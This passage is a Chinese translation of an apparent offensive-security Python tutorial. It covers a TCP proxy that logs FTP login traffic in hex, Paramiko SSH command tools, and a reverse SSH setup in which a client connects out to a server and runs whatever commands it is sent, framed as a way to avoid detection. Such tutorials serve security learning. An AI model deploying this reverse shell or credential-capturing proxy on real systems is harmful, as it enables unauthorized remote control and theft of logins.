class="keyword">if</span> <span class="keyword">not</span> len(local_buffer) <span class="keyword">or</span> <span class="keyword">not</span> len(remote_buffer): [<span class="number">4</span>]</span><br><span class="line">            client_socket.close()</span><br><span class="line">            remote_socket.close()</span><br><span class="line">            print(<span class="string">"[*] No more data. Closing connections."</span>)</span><br><span class="line">            <span class="keyword">break</span></span><br></pre></td></tr></table></figure>

<p>这个函数包含我们代理用的大部分逻辑功能。首先，我们连接到远程主机[1]。然后进行检查，确保不需要在进入主循环[2]之前先发起到远程端的连接并请求数据。一些服务器守护进程会希望您这样做(例如，FTP服务器通常会先发送一个<em>banner</em>)。然后，我们对通信的双方使用<em>receive_from</em>函数。它接受连接的套接字对象并执行接收数据。我们把数据包里的东西输出，这样我们就可以检查里面有什么有趣的东西。接下来，我们将输出传递给<em>response_handler</em>函数[3]，然后将接收到的buffer发送给本地客户端。代理代码的其余部分很简单:我们设置循环不断地从本地客户端读取,处理数据,将其发送到远程客户端,从远程客户端读取、处理数据,并将其发送到本地客户端,直到我们发现不到任何数据。当连接的任何一端都没有数据要发送时[4]，我们关闭本地和远程套接字，并跳出循环。</p>
<p>让我们用 <em>server_loop</em> 函数来设置和管理连接:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">server_loop</span><span class="params">(local_host, local_port,</span></span></span><br><span class="line"><span class="function"><span class="params">                remote_host, remote_port, receive_first)</span>:</span></span><br><span class="line">    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM) [<span class="number">1</span>]</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        server.bind((local_host, local_port)) [<span class="number">2</span>]</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        print(<span class="string">'problem on bind: %r'</span> % e)</span><br><span class="line"></span><br><span class="line">        print(<span class="string">"[!!] Failed to listen on %s:%d"</span> % (local_host, local_port))</span><br><span class="line">        print(<span class="string">"[!!] Check for other listening sockets or correct permissions."</span>)</span><br><span class="line">        sys.exit(<span class="number">0</span>)</span><br><span class="line">    print(<span class="string">"[*] Listening on %s:%d"</span> % (local_host, local_port))</span><br><span class="line">    server.listen(<span class="number">5</span>)</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>: [<span class="number">3</span>]</span><br><span class="line">        client_socket, addr = server.accept()</span><br><span class="line">        <span class="comment"># print out the local connection information</span></span><br><span class="line">        line = <span class="string">"&gt; Received incoming connection from %s:%d"</span> % (addr[<span class="number">0</span>], addr[<span class="number">1</span>])</span><br><span class="line">        print(line)</span><br><span class="line">        <span class="comment"># start a thread to talk to the remote host</span></span><br><span class="line">        proxy_thread = threading.Thread( [<span class="number">4</span>]</span><br><span class="line">            target=proxy_handler,</span><br><span class="line">            args=(client_socket, remote_host,</span><br><span class="line">            remote_port, receive_first))</span><br><span class="line">        proxy_thread.start()</span><br></pre></td></tr></table></figure>

<p><em>server_loop</em> 函数创建一个套接字[1]，然后绑定到本地主机并监听[2]。在主循环[3]中，当一个新的连接请求到来时，我们将它交给一个新线程[4]中的 <em>proxy_handler</em> 函数，该线程负责向数据流的任何一方发送和接收有价值的bits（数据信息）。</p>
<p>剩下要写的是 <em>main</em> 函数:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">if</span> len(sys.argv[<span class="number">1</span>:]) != <span class="number">5</span>:</span><br><span class="line">        print(<span class="string">"Usage: ./proxy.py [localhost] [localport]"</span>, end=<span class="string">''</span>)</span><br><span class="line">        print(<span class="string">"[remotehost] [remoteport] [receive_first]"</span>)</span><br><span class="line">        print(<span class="string">"Example: ./proxy.py 127.0.0.1 9000 10.12.132.1 9000 True"</span>)</span><br><span class="line">        sys.exit(<span class="number">0</span>)</span><br><span class="line">    local_host = sys.argv[<span class="number">1</span>]</span><br><span class="line">    local_port = int(sys.argv[<span class="number">2</span>])</span><br><span class="line">    remote_host = sys.argv[<span class="number">3</span>]</span><br><span class="line">    remote_port = int(sys.argv[<span class="number">4</span>])</span><br><span class="line">    receive_first = sys.argv[<span class="number">5</span>]</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> <span class="string">"True"</span> <span class="keyword">in</span> receive_first:</span><br><span class="line">        receive_first = <span class="literal">True</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        receive_first = <span class="literal">False</span></span><br><span class="line"></span><br><span class="line">    server_loop(local_host, local_port,</span><br><span class="line">        remote_host, remote_port, receive_first)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>

<p>在 <em>main</em> 函数中，我们接受一些命令行参数，然后启动服务器端用于监听连接的循环。</p>
<h3 id="Kicking-the-Tires-1"><a href="#Kicking-the-Tires-1" class="headerlink" title="Kicking the Tires"></a>Kicking the Tires</h3><p>现在我们已经有了核心代理循环和支持其功能函数，让我们在FTP服务器上测试它。使用以下选项启动代理:</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tim@kali: sudo python proxy.py 192.168.1.203 21 ftp.sun.ac.za 21 True</span><br></pre></td></tr></table></figure>

<p>我们在这里使用<em>sudo</em>，因为端口21是一个特权端口，所以监听它需要管理员或root权限。现在启动任意FTP客户端，并设置它使用localhost和端口21作为远程主机和端口。当然，您需要将代理指向实际响应您的FTP服务器。当我们在测试FTP服务器上运行时，我们得到了以下结果:</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line">[*] Listening on 192.168.1.203:21</span><br><span class="line">&gt; Received incoming connection from 192.168.1.203:47360</span><br><span class="line">[&lt;==] Received 30 bytes from remote.</span><br><span class="line">0000  32 32 30 20 57 65 6C 63 6F 6D 65 20 74 6F 20 66   220 Welcome to f</span><br><span class="line">0010  74 70 2E 73 75 6E 2E 61 63 2E 7A 61 0D 0A         tp.sun.ac.za..</span><br><span class="line">0000  55 53 45 52 20 61 6E 6F 6E 79 6D 6F 75 73 0D 0A   USER anonymous..</span><br><span class="line">0000  33 33 31 20 50 6C 65 61 73 65 20 73 70 65 63 69   331 Please speci</span><br><span class="line">0010  66 79 20 74 68 65 20 70 61 73 73 77 6F 72 64 2E   fy the password.</span><br><span class="line">0020  0D 0A                                             ..</span><br><span class="line">0000  50 41 53 53 20 73 65 6B 72 65 74 0D 0A            PASS sekret..</span><br><span class="line">0000  32 33 30 20 4C 6F 67 69 6E 20 73 75 63 63 65 73   230 Login succes</span><br><span class="line">0010  73 66 75 6C 2E 0D 0A                              sful...</span><br><span class="line">[==&gt;] Sent to <span class="built_in">local</span>.</span><br><span class="line">[&lt;==] Received 6 bytes from <span class="built_in">local</span>.</span><br><span class="line">0000  53 59 53 54 0D 0A                                 SYST..</span><br><span class="line">0000  32 31 35 20 55 4E 49 58 20 54 79 70 65 3A 20 4C   215 UNIX Type: L</span><br><span class="line">0010  38 0D 0A                                          8..</span><br><span class="line">[&lt;==] Received 28 bytes from <span class="built_in">local</span>.</span><br><span class="line">0000  50 4F 52 54 20 31 39 32 2C 31 36 38 2C 31 2C 32   PORT 192,168,1,2</span><br><span class="line">0010  30 33 2C 31 38 37 2C 32 32 33 0D 0A               03,187,223..</span><br><span class="line">0000  32 30 30 20 50 4F 52 54 20 63 6F 6D 6D 61 6E 64   200 PORT <span class="built_in">command</span></span><br><span class="line">0010  20 73 75 63 63 65 73 73 66 75 6C 2E 20 43 6F 6E    successful. Con</span><br><span class="line">0020  73 69 64 65 72 20 75 73 69 6E 67 20 50 41 53 56   sider using PASV</span><br><span class="line">0030  2E 0D 0A                                          ...</span><br><span class="line">[&lt;==] Received 6 bytes from <span class="built_in">local</span>.</span><br><span class="line">0000  4C 49 53 54 0D 0A                                 LIST..</span><br><span class="line">[&lt;==] Received 63 bytes from remote.</span><br><span class="line">0000  31 35 30 20 48 65 72 65 20 63 6F 6D 65 73 20 74   150 Here comes t</span><br><span class="line">0010  68 65 20 64 69 72 65 63 74 6F 72 79 20 6C 69 73   he directory lis</span><br><span class="line">0020  74 69 6E 67 2E 0D 0A 32 32 36 20 44 69 72 65 63   ting...226 Direc</span><br><span class="line">0030  74 6F 72 79 20 73 65 6E 64 20 4F 4B 2E 0D 0A      tory send OK...</span><br><span class="line">0000  50 4F 52 54 20 31 39 32 2C 31 36 38 2C 31 2C 32   PORT 192,168,1,2</span><br><span class="line">0010  30 33 2C 32 31 38 2C 31 31 0D 0A                  03,218,11..</span><br><span class="line">0000  32 30 30 20 50 4F 52 54 20 63 6F 6D 6D 61 6E 64   200 PORT <span class="built_in">command</span></span><br><span class="line">0010  20 73 75 63 63 65 73 73 66 75 6C 2E 20 43 6F 6E    successful. Con</span><br><span class="line">0020  73 69 64 65 72 20 75 73 69 6E 67 20 50 41 53 56   sider using PASV</span><br><span class="line">0030  2E 0D 0A                                          ...</span><br><span class="line">0000  51 55 49 54 0D 0A                                 QUIT..</span><br><span class="line">[==&gt;] Sent to remote.</span><br><span class="line">0000  32 32 31 20 47 6F 6F 64 62 79 65 2E 0D 0A         221 Goodbye...</span><br><span class="line">[==&gt;] Sent to <span class="built_in">local</span>.</span><br><span class="line">[*] No more data. Closing connections.</span><br></pre></td></tr></table></figure>

<p>在Kali机上的另一个终端上，我们使用默认端口21启动了一个到Kali机IP地址的FTP会话:</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">tim@kali:$ ftp 192.168.1.203</span><br><span class="line">Connected to 192.168.1.203.</span><br><span class="line">220 Welcome to ftp.sun.ac.za</span><br><span class="line">Name (192.168.1.203:tim): anonymous</span><br><span class="line">331 Please specify the password.</span><br><span class="line">Password:</span><br><span class="line">230 Login successful.</span><br><span class="line">Remote system <span class="built_in">type</span> is UNIX.</span><br><span class="line">Using binary mode to transfer files.</span><br><span class="line">ftp&gt; ls</span><br><span class="line">200 PORT <span class="built_in">command</span> successful. Consider using PASV.</span><br><span class="line">150 Here comes the directory listing.</span><br><span class="line">lrwxrwxrwx    1 1001     1001           48 Jul 17  2008 CPAN -&gt; pub/mirrors/</span><br><span class="line">ftp.funet.fi/pub/languages/perl/CPAN</span><br><span class="line">lrwxrwxrwx    1 1001     1001           21 Oct 21  2009 CRAN -&gt; pub/mirrors/</span><br><span class="line">ubuntu.com</span><br><span class="line">drwxr-xr-x    2 1001     1001         4096 Apr 03  2019 veeam</span><br><span class="line">drwxr-xr-x    6 1001     1001         4096 Jun 27  2016 win32InetKeyTeraTerm</span><br><span class="line">226 Directory send OK.</span><br><span class="line">ftp&gt; <span class="built_in">bye</span></span><br><span class="line">221 Goodbye.</span><br></pre></td></tr></table></figure>

<p>您可以清楚地看到，我们能够成功地接收FTP <em>banner</em>并发送用户名和密码，并且它可以干净地退出。</p>
<h2 id="SSH-with-Paramiko"><a href="#SSH-with-Paramiko" class="headerlink" title="SSH with Paramiko"></a>SSH with Paramiko</h2><p>(笔者注：Paramiko是SSHv2协议的Python(2.7，3.4+)实现，同时提供客户端和服务器功能，支持以加密和认证的方式，进行远程服务器的连接。)</p>
<p>以我们构建的netcat替代工具 BHNET 为中心使用非常方便，但更明智的是对流量进行加密以避免被检测。一种常见的方法是使用Secure Shell (SSH)隧道传输。但是，如果您的目标像99.81943 %的Windows系统那样没有SSH客户端，该怎么办呢?</p>
<p>虽然Windows上有很好的SSH客户端，比如 PuTTY ，但这是一本关于Python的书。在Python中，您可以使用原始套接字和一些加密戏法，来创建您自己的SSH客户端或服务器——但是既然可以利用已有的，为什么还要自己创建呢?基于PyCrypto的 Paramiko 提供了对SSH2协议的简单使用方法。</p>
<p>了解这个库是如何工作的,我们将使用Paramiko在SSH系统上建立连接并运行命令,在Windows机器上配置SSH服务器和SSH客户端来执行远程命令，最后找出Paramiko包含的反向隧道演示文件来复制BHNET的代理选项。让我们开始吧。</p>
<p>首先，使用 <em>pip</em> 安装程序来获取Paramiko(或从<a href="http://www.paramiko.org/" target="_blank" rel="noopener">http://www.paramiko.org/</a>下载)：</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip install paramiko</span><br></pre></td></tr></table></figure>

<p>稍后我们将使用一些演示文件，所以也请确保从Paramiko GitHub repo下载到它们(<a href="https://github.com/paramiko/Paramiko/" target="_blank" rel="noopener">https://github.com/paramiko/Paramiko/</a>)。</p>
<p>创建一个名为 <em>ssh_cmd.py</em> 的新文件，并输入以下内容:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> paramiko</span><br><span class="line"></span><br><span class="line">[<span class="number">1</span>] <span class="function"><span class="keyword">def</span> <span class="title">ssh_command</span><span class="params">(ip, port, user, passwd, cmd)</span>:</span></span><br><span class="line">    client = paramiko.SSHClient()</span><br><span class="line">    [<span class="number">2</span>] client.set_missing_host_key_policy(paramiko.AutoAddPolicy())</span><br><span class="line">    client.connect(ip, port=port, username=user, password=passwd)</span><br><span class="line">    </span><br><span class="line">    [<span class="number">3</span>] _, stdout, stderr = client.exec_command(cmd)</span><br><span class="line">    output = stdout.readlines() + stderr.readlines()</span><br><span class="line">    <span class="keyword">if</span> output:</span><br><span class="line">        print(<span class="string">'--- Output ---'</span>)</span><br><span class="line">        <span class="keyword">for</span> line <span class="keyword">in</span> output:</span><br><span class="line">            print(line.strip())</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    [<span class="number">4</span>] <span class="keyword">import</span> getpass</span><br><span class="line">    <span class="comment"># user = getpass.getuser()</span></span><br><span class="line">    user = input(<span class="string">'Username: '</span>)</span><br><span class="line">    password = getpass.getpass()</span><br><span class="line">    </span><br><span class="line">    ip = input(<span class="string">'Enter server IP: '</span>) <span class="keyword">or</span> <span class="string">'192.168.1.203'</span></span><br><span class="line">    port = input(<span class="string">'Enter port or &lt;CR&gt;: '</span>) <span class="keyword">or</span> <span class="number">2222</span></span><br><span class="line">    cmd = input(<span class="string">'Enter command or &lt;CR&gt;: '</span>) <span class="keyword">or</span> <span class="string">'id'</span></span><br><span class="line">    [<span class="number">5</span>] ssh_command(ip, port, user, password, cmd)</span><br></pre></td></tr></table></figure>

<p>我们创建一个名为 <em>ssh_command</em> [1]的函数，它连接到SSH服务器并运行单个命令。请注意，Paramiko支持使用密钥进行身份验证，来代替(或同时)使用密码进行身份验证。您应该在实际工作中使用SSH密钥身份验证，但在本例中为了便于使用，我们仍然使用传统的用户名和密码来身份验证。</p>
<p>因为我们控制这个连接的两端，所以我们将策略设置为接受我们所连接的SSH服务器的SSH密钥[2]并建立连接。假设建立了连接，我们运行在 <em>ssh_command</em> 函数调用中传入的命令[3]。然后，如果该命令产生输出，则打印输出的每一行。</p>
<p>在main模块中，我们使用了一个新模块 <em>getpass</em> [4]。您可以使用它从当前环境中获取用户名，但是由于我们的用户名在两台机器上是不同的，所以我们在命令行上需要显式地请求用户名。然后，我们使用 <em>getpass</em> 函数请求密码(响应不会显示在控制台上，以防止任何shoulder-surfers窃取)。然后我们得到要运行的IP、端口和命令(cmd)，并将其发送给执行[5]。</p>
<p>(笔者注：shoulder-surfers:〔美国〕(以排在他人身后窥视或在远处以望远镜偷看等手段)窃取他人银行存款卡[电话卡等]密码的人，窃号贼，肩膀骇客。)</p>
<p>让我们通过连接到我们的Linux服务器来运行一个快速测试:</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">% python ssh_cmd.py</span><br><span class="line">Username: tim</span><br><span class="line">Password:</span><br><span class="line">Enter server IP: 192.168.1.203</span><br><span class="line">Enter port or &lt;CR&gt;: 22</span><br><span class="line">Enter <span class="built_in">command</span> or &lt;CR&gt;: id</span><br><span class="line">--- Output ---</span><br><span class="line">uid=1000(tim) gid=1000(tim) groups=1000(tim),27(sudo)</span><br></pre></td></tr></table></figure>

<p>可以看到我们设置连接并运行了该命令。您可以轻松地修改此脚本，以便在一个SSH服务器上运行 <em>multiple</em> 多个命令，或者在 <em>multiple</em> 多个SSH服务器上运行命令。</p>
<p>(笔者注：multiple既有 多种的 的意思，也有 许多的 的意思)</p>
<p>基本工作完成后，让我们修改脚本，使其能够通过SSH在Windows客户机上运行命令。当然，在使用SSH时，您通常会使用SSH客户端连接到SSH服务器，但是由于大多数版本的Windows不包括开箱即用的(预装并设置好的)SSH服务器，因此我们需要反向操作，从SSH服务器向SSH客户端发送命令。</p>
<p>创建一个新文件命名为 <em>ssh_rcmd.py</em> ，并输入以下内容:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> paramiko</span><br><span class="line"><span class="keyword">import</span> shlex</span><br><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">ssh_command</span><span class="params">(ip, port, user, passwd, command)</span>:</span></span><br><span class="line">    client = paramiko.SSHClient()</span><br><span class="line">    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())</span><br><span class="line">    client.connect(ip, port=port, username=user, password=passwd)</span><br><span class="line">    </span><br><span class="line">    ssh_session = client.get_transport().open_session()</span><br><span class="line">    <span class="keyword">if</span> ssh_session.active:</span><br><span class="line">        ssh_session.send(command)</span><br><span class="line">        print(ssh_session.recv(<span class="number">1024</span>).decode())</span><br><span class="line">        <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">            command = ssh_session.recv(<span class="number">1024</span>) [<span class="number">1</span>]</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                cmd = command.decode()</span><br><span class="line">                <span class="keyword">if</span> cmd == <span class="string">'exit'</span>:</span><br><span class="line">                    client.close()</span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line">                cmd_output = subprocess.check_output(shlex.split(cmd), shell=<span class="literal">True</span>) [<span class="number">2</span>]</span><br><span class="line">                ssh_session.send(cmd_output <span class="keyword">or</span> <span class="string">'okay'</span>) [<span class="number">3</span>]</span><br><span class="line">            <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">                 ssh_session.send(str(e))</span><br><span class="line">         client.close()</span><br><span class="line">    <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    <span class="keyword">import</span> getpass</span><br><span class="line">    user = getpass.getuser()</span><br><span class="line">    password = getpass.getpass()</span><br><span class="line">    </span><br><span class="line">    ip = input(<span class="string">'Enter server IP: '</span>)</span><br><span class="line">    port = input(<span class="string">'Enter port: '</span>)</span><br><span class="line">    ssh_command(ip, port, user, password, <span class="string">'ClientConnected'</span>) [<span class="number">4</span>]</span><br></pre></td></tr></table></figure>

<p>程序像上一个程序一样开始，新的内容在 <em>while True:</em> 循环中开始。在这个循环中，我们不像在前面的示例中那样执行单个命令，而是从连接获取命令[1]，执行命令[2]，并将所有输出返回给调用者[3]。</p>
<p>另外，请注意，我们发送的第一个命令是 <em>ClientConnected</em> [4]。当我们创建SSH连接的另一端时，您将看到这是为什么。</p>
<p>现在，让我们编写一个程序，为我们的SSH客户端(我们将在其中运行命令)创建一个要连接到的SSH服务器。这可以是安装了Python和Paramiko的Linux、Windows甚至macOS系统。创建一个新文件命名为 <em>ssh_server.py</em> 的，并输入以下内容:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> paramiko</span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"></span><br><span class="line">CWD = os.path.dirname(os.path.realpath(__file__))</span><br><span class="line">[<span class="number">1</span>] HOSTKEY = paramiko.RSAKey(filename=os.path.join(CWD, <span class="string">'test_rsa.key'</span>))</span><br><span class="line"></span><br><span class="line">[<span class="number">2</span>] <span class="class"><span class="keyword">class</span> <span class="title">Server</span> <span class="params">(paramiko.ServerInterface)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">_init_</span><span class="params">(self)</span>:</span></span><br><span class="line">        self.event = threading.Event()</span><br><span class="line"> </span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">check_channel_request</span><span class="params">(self, kind, chanid)</span>:</span></span><br><span class="line">        <span class="keyword">if</span> kind == <span class="string">'session'</span>:</span><br><span class="line">            <span class="keyword">return</span> paramiko.OPEN_SUCCEEDED</span><br><span class="line">        <span class="keyword">return</span> paramiko.OPEN_FAILED_ADMINISTRATIVELY_PROHIBITED</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">check_auth_password</span><span class="params">(self, username, password)</span>:</span></span><br><span class="line">        <span class="keyword">if</span> (username == <span class="string">'tim'</span>) <span class="keyword">and</span> (password == <span class="string">'sekret'</span>):</span><br><span class="line">            <span class="keyword">return</span> paramiko.AUTH_SUCCESSFUL</span><br><span class="line">  </span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    server = <span class="string">'192.168.1.207'</span></span><br><span class="line">    ssh_port = <span class="number">2222</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">        sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, <span class="number">1</span>)</span><br><span class="line">        [<span class="number">3</span>] sock.bind((server, ssh_port))</span><br><span class="line">        sock.listen(<span class="number">100</span>)</span><br><span class="line">        print(<span class="string">'[+] Listening for connection ...'</span>)</span><br><span class="line">        client, addr = sock.accept()</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        print(<span class="string">'[-] Listen failed: '</span> + str(e))</span><br><span class="line">        sys.exit(<span class="number">1</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        print(<span class="string">'[+] Got a connection!'</span>, client, addr)</span><br><span class="line">    </span><br><span class="line">    [<span class="number">4</span>] bhSession = paramiko.Transport(client)</span><br><span class="line">    bhSession.add_server_key(HOSTKEY)</span><br><span class="line">    server = Server()</span><br><span class="line">    bhSession.start_server(server=server)</span><br><span class="line">    chan = bhSession.accept(<span class="number">20</span>)</span><br><span class="line">    <span class="keyword">if</span> chan <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">        print(<span class="string">'*** No channel.'</span>)</span><br><span class="line">        sys.exit(<span class="number">1</span>)</span><br><span class="line"> </span><br><span class="line"> [<span class="number">5</span>] print(<span class="string">'[+] Authenticated!'</span>)</span><br><span class="line"> [<span class="number">6</span>] print(chan.recv(<span class="number">1024</span>))</span><br><span class="line">    chan.send(<span class="string">'Welcome to bh_ssh'</span>)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">            command= input(<span class="string">"Enter command: "</span>)</span><br><span class="line">            <span class="keyword">if</span> command != <span class="string">'exit'</span>:</span><br><span class="line">                chan.send(command)</span><br><span class="line">                r = chan.recv(<span class="number">8192</span>)</span><br><span class="line">                print(r.decode())</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                chan.send(<span class="string">'exit'</span>)</span><br><span class="line">                print(<span class="string">'exiting'</span>)</span><br><span class="line">                bhSession.close()</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">except</span> KeyboardInterrupt:</span><br><span class="line">        bhSession.close()</span><br></pre></td></tr></table></figure>

<p>对于这个例子，我们使用Paramiko演示文件[1]中包含的SSH密钥。我们启动一个套接字监听器[3]，就像我们在本章前面所做的那样，然后“SSH-inize”它[2]，并配置验证方法[4]。当一个客户端已经验证[5]并发送我们 <em>ClientConnected</em> 的消息[6],我们键入SSH服务器(服务器机器运行 <em>ssh_server.py</em> )的任何命令被发送到SSH客户端(客户端机器运行 <em>ssh_rcmd.py</em> )并在SSH客户端执行,它返回输出到SSH服务器。让我们试一下吧。</p>
